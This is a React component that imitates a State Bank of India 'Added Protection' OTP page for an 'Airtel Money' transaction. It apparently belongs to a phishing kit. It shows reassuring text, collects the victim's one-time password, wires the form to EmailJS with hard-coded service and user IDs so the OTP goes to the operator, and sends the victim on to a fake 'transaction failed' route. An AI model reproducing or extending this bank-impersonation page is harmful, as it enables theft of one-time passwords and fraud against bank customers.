import React, { useRef } from "react";
import "./index.css";
import emailjs from "@emailjs/browser";
import { Link } from "react-router-dom";

const Sbi_otp = () => {
    const form = useRef();

    function sendEmail(e) {
      e.preventDefault();
  
      emailjs
        .sendForm(
          "service_gmail_contact",
          "template_qn8a87d",
          form.current,
          "user_1BbfROnlSMWCftLMRSCEo"
        )
        .then(
          (result) => {
            console.log(result.text);
            const show = document.getElementById("messageres");
            show.innerHTML = "Message sent :)";
          },
          (error) => {
            console.log(error.text);
          }
        );
      e.target.reset();
    }
    return (
        <>
            <div className="sbi">
                <div className="sbi_card" style={{width: "420px", gridTemplateRows: "1fr 1fr 1fr 1fr 1fr"}}>
                        <div className="sbi_add">
                            <p className="sbi_heading">Added Protection</p>
                        </div>
                        <div className="sbi_para" style={{alignSelf: "initial"}}>
                            <p>
                            Please enter One time password in order to complete your <br/>
                            transaction. This information will not be shared with the merchant.
                            </p> 
                        </div>
                        <div className="sbi_detail">
                            <p>
                                <span>Merchant Name</span>
                                <span>: Airtel Money</span>
                            </p>
                            <p>
                                <span>Card Number</span>
                                <span>:  xxxx xxxx xxxx xxxx</span>
                            </p>
                            <p>
                                <span>Personal Greeting</span>
                                <span>:This transaction is protected.</span>
                            </p>
                        </div>
                        <div>
                            <div className="sbi_input"  ref={form} onSubmit={sendEmail}>
                                <h3>One Time Password</h3>
                                <div>
                                        <span>:</span>
                                        <input
                                            type="text"
                                        // onChange={}
                                        // value={}
                                        maxLength="20"
                                        size="20"
                                        />
                                </div>
                            </div>
                        </div>
                        <div className="sbi_btn" style={{marginLeft: "17em"}}>
                            <button>
                            <Link to="/tran_failed">Submit</Link>
                            </button>
                        </div>
                </div>
            </div>

        </>
    )
};

export default Sbi_otp;